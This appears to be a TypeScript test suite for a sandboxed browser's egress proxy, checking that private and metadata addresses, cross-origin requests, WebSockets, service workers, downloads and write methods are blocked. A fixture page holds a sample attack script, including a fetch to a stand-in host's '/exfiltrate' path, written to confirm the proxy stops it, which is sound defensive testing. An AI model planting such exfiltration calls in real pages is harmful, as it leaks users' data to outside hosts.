import assert from "node:assert/strict";
import { createHash, X509Certificate } from "node:crypto";
import { existsSync, readFileSync } from "node:fs";
import { createServer as createHttpsServer } from "node:https";
import type { IncomingMessage, ServerResponse } from "node:http";
import { join } from "node:path";
import { connect as connectTcp, type Socket } from "node:net";
import { connect as connectTls, type TLSSocket } from "node:tls";
import { chromium } from "@playwright/test";
import test from "node:test";
import {
  isPublicWebBrowserAddress,
  normalizeWebBrowserTarget,
} from "../src/lib/web-browser-policy";
import {
  createWebBrowserEgressProxyForTest,
  type WebBrowserEgressProxy,
} from "../src/lib/web-browser-egress-proxy";
import { normalizeWebBrowserVisibleText } from "../src/lib/web-browser-visible-text";

const CERTIFICATE = readFileSync(join(process.cwd(), "test/fixtures/web-browser-origin-test-cert.pem.fixture"));
const PRIVATE_KEY = readFileSync(join(process.cwd(), "test/fixtures/web-browser-origin-test-key.pem.fixture"));
const FIXTURE_HOST = "browser-source.example";
const PROXY_USERNAME = "web-browser-test";
const PROXY_PASSWORD = "web-browser-test-proxy-password-42";
const cert = new X509Certificate(CERTIFICATE);
const certificatePin = createHash("sha256")
  .update(cert.publicKey.export({ format: "der", type: "spki" }))
  .digest("base64");

type Fixture = Readonly<{
  upstream: ReturnType<typeof createHttpsServer>;
  proxy: WebBrowserEgressProxy;
  origin: string;
  target: string;
  proxyPort: number;
  resolvedHosts: string[];
  serviceWorkerRequests: () => number;
  upstreamUpgradeRequests: () => number;
}>;

type TestProxyOverrides = Readonly<{
  maxRequestBytes?: number;
  maxTotalBytes?: number;
  allowPrivateAddresses?: boolean;
  resolveHostname?: (hostname: string) => Promise<readonly Readonly<{ address: string; family: number }>[] >;
}>;

function sendPage(_request: IncomingMessage, response: ServerResponse): void {
  response.writeHead(200, { "content-type": "text/html; charset=utf-8" });
  response.end(`<!doctype html><html><body><p>Visible shell text</p><script>
    document.body.insertAdjacentHTML('beforeend', '<p id="rendered">Rendered by JavaScript</p>');
  </script></body></html>`);
}

async function startFixture(proxyOptions: TestProxyOverrides = {}): Promise<Fixture> {
  let workerRequests = 0;
  let upgradeRequests = 0;
  const resolvedHosts: string[] = [];
  const upstream = createHttpsServer({ cert: CERTIFICATE, key: PRIVATE_KEY }, (request, response) => {
    switch (request.url) {
      case "/js": sendPage(request, response); return;
      case "/render-attacks":
        response.writeHead(200, { "content-type": "text/html; charset=utf-8" });
        response.end(`<!doctype html><html><body><p>Attack test page</p><script>
          document.body.insertAdjacentHTML('beforeend', '<p id="rendered">Rendered by JavaScript</p>');
          navigator.serviceWorker.register('/worker.js').then(
            () => document.body.dataset.serviceWorker = 'registered',
            () => document.body.dataset.serviceWorker = 'blocked'
          );
          fetch('https://outside.example/exfiltrate', { mode: 'no-cors' }).then(
            () => document.body.dataset.crossOriginFetch = 'allowed',
            () => document.body.dataset.crossOriginFetch = 'blocked'
          );
          const socket = new WebSocket(location.origin.replace(/^https:/, 'wss:') + '/socket');
          socket.addEventListener('open', () => document.body.dataset.webSocket = 'open');
          socket.addEventListener('error', () => document.body.dataset.webSocket = 'blocked');
        </script></body></html>`);
        return;
      case "/redirect-cross-origin":
        response.writeHead(302, { location: "https://outside.example/landing" });
        response.end();
        return;
      case "/redirect-same-origin":
        response.writeHead(302, { location: "/js" });
        response.end();
        return;
      case "/download":
        response.writeHead(200, { "content-disposition": "attachment; filename=secret.txt", "content-length": "6" });
        response.end("secret");
        return;
      case "/large":
        response.writeHead(200, { "content-length": "256" });
        response.end(Buffer.alloc(256, 65));
        return;
      case "/worker.js":
        workerRequests += 1;
        response.writeHead(200, { "content-type": "application/javascript" });
        response.end("self.addEventListener('fetch', () => {});");
        return;
      default:
        response.writeHead(404, { "content-length": "0" });
        response.end();
    }
  });
  upstream.on("upgrade", (_request, socket) => {
    upgradeRequests += 1;
    socket.end("HTTP/1.1 101 Switching Protocols\r\n\r\n");
  });
  await new Promise<void>((resolve) => upstream.listen(0, "127.0.0.1", resolve));
  const upstreamAddress = upstream.address();
  assert(upstreamAddress && typeof upstreamAddress !== "string");
  const origin = `https://${FIXTURE_HOST}:${upstreamAddress.port}`;
  const proxy = createWebBrowserEgressProxyForTest({
    sourceOrigin: origin,
    username: PROXY_USERNAME,
    password: PROXY_PASSWORD,
    certificate: CERTIFICATE,
    privateKey: PRIVATE_KEY,
    host: "127.0.0.1",
    port: 0,
    maxRequests: 12,
    maxRequestBytes: proxyOptions.maxRequestBytes ?? 4096,
    maxTotalBytes: proxyOptions.maxTotalBytes ?? 1024,
    requestTimeoutMs: 1500,
    jobTimeoutMs: 10000,
    maxTunnels: 8,
  }, {
    allowPrivateAddresses: proxyOptions.allowPrivateAddresses ?? true,
    resolveHostname: async (hostname) => {
      resolvedHosts.push(hostname);
      return await (proxyOptions.resolveHostname ?? (async () => [{ address: "127.0.0.1", family: 4 }]))(hostname);
    },
    upstreamCa: CERTIFICATE,
  });
  await new Promise<void>((resolve) => proxy.server.listen(0, "127.0.0.1", resolve));
  const proxyAddress = proxy.server.address();
  assert(proxyAddress && typeof proxyAddress !== "string");
  return Object.freeze({
    upstream,
    proxy,
    origin,
    target: `${origin}/js`,
    proxyPort: proxyAddress.port,
    resolvedHosts,
    serviceWorkerRequests: () => workerRequests,
    upstreamUpgradeRequests: () => upgradeRequests,
  });
}

async function closeFixture(fixture: Fixture): Promise<void> {
  await fixture.proxy.close();
  await new Promise<void>((resolve) => fixture.upstream.close(() => resolve()));
}

type ProxyResponse = Readonly<{ status: number; headers: string; body: Buffer }>;

async function requestThroughProxy(
  fixture: Fixture,
  options: Readonly<{ method?: string; path?: string; headers?: Readonly<Record<string, string>>; username?: string; password?: string }> = {},
): Promise<ProxyResponse> {
  const proxySocket = connectTcp(fixture.proxyPort, "127.0.0.1");
  await new Promise<void>((resolve, reject) => {
    proxySocket.once("connect", resolve);
    proxySocket.once("error", reject);
  });
  proxySocket.write([
    `CONNECT ${new URL(fixture.origin).host} HTTP/1.1`,
    `Host: ${new URL(fixture.origin).host}`,
    `Proxy-Authorization: Basic ${Buffer.from(`${options.username ?? PROXY_USERNAME}:${options.password ?? PROXY_PASSWORD}`).toString("base64")}`,
    "",
    "",
  ].join("\r\n"));

  const connectResponse = await readHeaderBlock(proxySocket);
  const connectStatus = Number(/^HTTP\/1\.1 (\d{3})/u.exec(connectResponse)?.[1]);
  if (connectStatus !== 200) {
    proxySocket.destroy();
    return { status: connectStatus, headers: connectResponse, body: Buffer.alloc(0) };
  }

  const secureSocket = connectTls({ socket: proxySocket, servername: FIXTURE_HOST, ca: CERTIFICATE, rejectUnauthorized: true });
  await new Promise<void>((resolve, reject) => {
    secureSocket.once("secureConnect", resolve);
    secureSocket.once("error", reject);
  });
  const requestBody = options.headers?.["content-length"] === undefined ? "" : "x".repeat(Number(options.headers["content-length"]));
  const headers = {
    host: new URL(fixture.origin).host,
    connection: "close",
    ...options.headers,
  };
  secureSocket.write([
    `${options.method ?? "GET"} ${options.path ?? "/js"} HTTP/1.1`,
    ...Object.entries(headers).map(([name, value]) => `${name}: ${value}`),
    "",
    requestBody,
  ].join("\r\n"));
  return readHttpResponse(secureSocket);
}

function readHeaderBlock(socket: Socket | TLSSocket): Promise<string> {
  return new Promise((resolve, reject) => {
    let buffer = Buffer.alloc(0);
    const timeout = setTimeout(() => reject(new Error("proxy response timeout")), 3000);
    const onData = (chunk: Buffer) => {
      buffer = Buffer.concat([buffer, chunk]);
      const boundary = buffer.indexOf("\r\n\r\n");
      if (boundary < 0) return;
      clearTimeout(timeout);
      socket.pause();
      socket.off("data", onData);
      socket.unshift(buffer.subarray(boundary + 4));
      resolve(buffer.subarray(0, boundary).toString("latin1"));
    };
    socket.on("data", onData);
    socket.once("error", (error) => {
      clearTimeout(timeout);
      reject(error);
    });
    socket.once("end", () => {
      clearTimeout(timeout);
      if (buffer.length > 0) resolve(buffer.toString("latin1"));
      else reject(new Error("proxy ended without a response"));
    });
  });
}

function readHttpResponse(socket: TLSSocket): Promise<ProxyResponse> {
  return new Promise((resolve, reject) => {
    const chunks: Buffer[] = [];
    const timeout = setTimeout(() => {
      socket.destroy();
      reject(new Error("origin response timeout"));
    }, 4000);
    socket.on("data", (chunk: Buffer) => chunks.push(chunk));
    socket.once("error", (error) => {
      clearTimeout(timeout);
      if (chunks.length > 0) {
        const data = Buffer.concat(chunks);
        resolve(parseHttpResponse(data));
      } else reject(error);
    });
    socket.once("end", () => {
      clearTimeout(timeout);
      resolve(parseHttpResponse(Buffer.concat(chunks)));
    });
  });
}

function parseHttpResponse(data: Buffer): ProxyResponse {
  const boundary = data.indexOf("\r\n\r\n");
  assert(boundary >= 0, "response should contain headers");
  const headers = data.subarray(0, boundary).toString("latin1");
  const status = Number(/^HTTP\/1\.1 (\d{3})/u.exec(headers)?.[1]);
  return { status, headers, body: data.subarray(boundary + 4) };
}

async function withFixture<T>(
  run: (fixture: Fixture) => Promise<T>,
  proxyOptions: TestProxyOverrides = {},
): Promise<T> {
  const fixture = await startFixture(proxyOptions);
  try {
    return await run(fixture);
  } finally {
    await closeFixture(fixture);
  }
}

let browserAvailable = false;
try {
  browserAvailable = existsSync(chromium.executablePath());
} catch {
  browserAvailable = false;
}

test("web browser targets accept exact HTTPS URLs and reject credentials or non-HTTPS schemes", () => {
  assert.equal(normalizeWebBrowserTarget("https://example.com/a#section").url, "https://example.com/a");
  for (const value of ["http://example.com", "https://user:secret@example.com", "https://example.com\n"] as const) {
    assert.throws(() => normalizeWebBrowserTarget(value), { code: "WEB_BROWSER_INVALID_TARGET" });
  }
});

test("web browser visible text is normalized and capped at 20,000 characters", () => {
  const text = normalizeWebBrowserVisibleText(` A  B\r\n${"x".repeat(20_100)}`);
  assert.equal(text.length, 20_000);
  assert.equal(text.includes("\u0000"), false);
  assert.equal(text.startsWith("A B\n"), true);
});

test("web browser public address policy rejects reserved, private, mapped, and metadata addresses", () => {
  for (const address of [
    "0.0.0.0", "10.0.0.1", "100.64.0.1", "127.0.0.1", "169.254.169.254", "172.20.0.1",
    "192.0.2.1", "192.168.1.1", "198.18.0.1", "203.0.113.7", "224.0.0.1", "240.0.0.1",
    "::", "::1", "::ffff:127.0.0.1", "fc00::1", "fe80::1", "2001:db8::1", "2002::1", "ff02::1",
  ]) assert.equal(isPublicWebBrowserAddress(address), false, address);
  for (const address of ["8.8.8.8", "93.184.216.34", "2606:4700:4700::1111", "2001:4860:4860::8888"]) {
    assert.equal(isPublicWebBrowserAddress(address), true, address);
  }
});

test("web browser proxy accepts only a canonical credential-free HTTPS origin", () => {
  const base = {
    username: PROXY_USERNAME,
    password: PROXY_PASSWORD,
    certificate: CERTIFICATE,
    privateKey: PRIVATE_KEY,
  };
  for (const sourceOrigin of ["http://example.com", "https://user@example.com", "https://example.com/path", "https://example.com/"]) {
    assert.throws(() => createWebBrowserEgressProxyForTest({ ...base, sourceOrigin }, {
      allowPrivateAddresses: false,
      resolveHostname: async () => [{ address: "93.184.216.34", family: 4 }],
    }), { code: "WEB_BROWSER_INVALID_TARGET" });
  }
});

test("web browser proxy requires per-job credentials and one exact CONNECT origin", async () => {
  await withFixture(async (fixture) => {
    const unauthenticated = await requestThroughProxy(fixture, { password: "wrong-password" });
    assert.equal(unauthenticated.status, 407);
    assert.match(unauthenticated.headers, /Proxy-Authenticate: Basic/u);

    const crossOrigin = await new Promise<number>(async (resolve, reject) => {
      const socket = connectTcp(fixture.proxyPort, "127.0.0.1");
      socket.once("error", reject);
      socket.once("connect", () => socket.write([
        "CONNECT outside.example:443 HTTP/1.1",
        "Host: outside.example:443",
        `Proxy-Authorization: Basic ${Buffer.from(`${PROXY_USERNAME}:${PROXY_PASSWORD}`).toString("base64")}`,
        "",
        "",
      ].join("\r\n")));
      const response = await readHeaderBlock(socket);
      socket.destroy();
      resolve(Number(/^HTTP\/1\.1 (\d{3})/u.exec(response)?.[1]));
    });
    assert.equal(crossOrigin, 403);
  });
});

test("web browser proxy pins only public DNS answers and rejects a mixed public/private result", async () => {
  await withFixture(async (fixture) => {
    const response = await requestThroughProxy(fixture);
    assert.equal(response.status, 403);
  }, {
    allowPrivateAddresses: false,
    resolveHostname: async () => [
      { address: "93.184.216.34", family: 4 },
      { address: "127.0.0.1", family: 4 },
    ],
  });
  await withFixture(async (fixture) => {
    assert.equal((await requestThroughProxy(fixture)).status, 403);
  }, {
    allowPrivateAddresses: false,
    resolveHostname: async () => Array.from({ length: 33 }, (_, index) => ({
      address: `93.184.216.${index + 1}`,
      family: 4,
    })),
  });
});

test("web browser proxy rejects write methods, WebSocket upgrades, cross-origin redirects, downloads, and oversized bodies", async () => {
  await withFixture(async (fixture) => {
    assert.equal((await requestThroughProxy(fixture, { method: "POST", path: "/js", headers: { "content-length": "0" } })).status, 405);
    assert.equal((await requestThroughProxy(fixture, {
      method: "GET",
      path: "/ws",
      headers: { connection: "keep-alive, Upgrade", upgrade: "websocket", "sec-websocket-key": "dGhlIHNhbXBsZSBub25jZQ==", "sec-websocket-version": "13" },
    })).status, 405);

    const redirect = await requestThroughProxy(fixture, { path: "/redirect-cross-origin" });
    assert.equal(redirect.status, 451);
    assert.doesNotMatch(redirect.headers.toLowerCase(), /location:/u);
    assert.equal((await requestThroughProxy(fixture, { path: "/download" })).status, 413);
    assert.equal((await requestThroughProxy(fixture, { path: "/large" })).status, 413);
  }, { maxRequestBytes: 128 });
});

test("web browser proxy permits a same-origin redirect and forwards only the pinned origin request", async () => {
  await withFixture(async (fixture) => {
    const response = await requestThroughProxy(fixture, { path: "/redirect-same-origin" });
    assert.equal(response.status, 302);
    assert.match(response.headers, /location: \/js/iu);
  });
});

test("Playwright renders JS while cross-origin resources, WebSockets, and Service Workers fail closed", { skip: !browserAvailable }, async () => {
  await withFixture(async (fixture) => {
    const browser = await chromium.launch({
      headless: true,
      proxy: {
        server: `http://127.0.0.1:${fixture.proxyPort}`,
        username: PROXY_USERNAME,
        password: PROXY_PASSWORD,
      },
      args: [
        `--ignore-certificate-errors-spki-list=${certificatePin}`,
        "--proxy-bypass-list=<-loopback>",
        "--host-resolver-rules=MAP * ~NOTFOUND,EXCLUDE 127.0.0.1",
        "--disable-background-networking",
        "--disable-component-update",
        "--disable-sync",
        "--no-first-run",
        "--no-default-browser-check",
      ],
    });
    try {
      const context = await browser.newContext({ acceptDownloads: false, serviceWorkers: "block" });
      const page = await context.newPage();
      const crossOriginFailures: string[] = [];
      page.on("requestfailed", (request) => {
        if (new URL(request.url()).hostname === "outside.example") crossOriginFailures.push(request.url());
      });
      const response = await page.goto(`${fixture.origin}/render-attacks`, { waitUntil: "domcontentloaded", timeout: 8000 });
      assert.equal(response?.status(), 200);
      assert.equal(await page.locator("#rendered").innerText(), "Rendered by JavaScript");
      try {
        await page.waitForFunction(() =>
          document.body?.dataset.crossOriginFetch === "blocked" &&
          document.body?.dataset.webSocket === "blocked",
        undefined, { timeout: 8000 });
      } catch {
        const state = await page.evaluate(() => ({
          serviceWorker: document.body?.dataset.serviceWorker ?? "pending",
          crossOriginFetch: document.body?.dataset.crossOriginFetch ?? "pending",
          webSocket: document.body?.dataset.webSocket ?? "pending",
        }));
        assert.fail(`browser attack checks did not settle: ${JSON.stringify({
          state,
          activeServiceWorkerCount: context.serviceWorkers().length,
          serviceWorkerRequests: fixture.serviceWorkerRequests(),
          upstreamUpgradeRequests: fixture.upstreamUpgradeRequests(),
          outsideHostResolved: fixture.resolvedHosts.includes("outside.example"),
          crossOriginFailures: crossOriginFailures.length,
        })}`);
      }
      assert.equal(context.serviceWorkers().length, 0);
      assert.equal(fixture.serviceWorkerRequests(), 0);
      assert.equal(fixture.upstreamUpgradeRequests(), 0);
      assert(crossOriginFailures.length > 0);
      assert.equal(fixture.resolvedHosts.includes("outside.example"), false);
      await context.close();
    } finally {
      await browser.close();
    }
  });
});
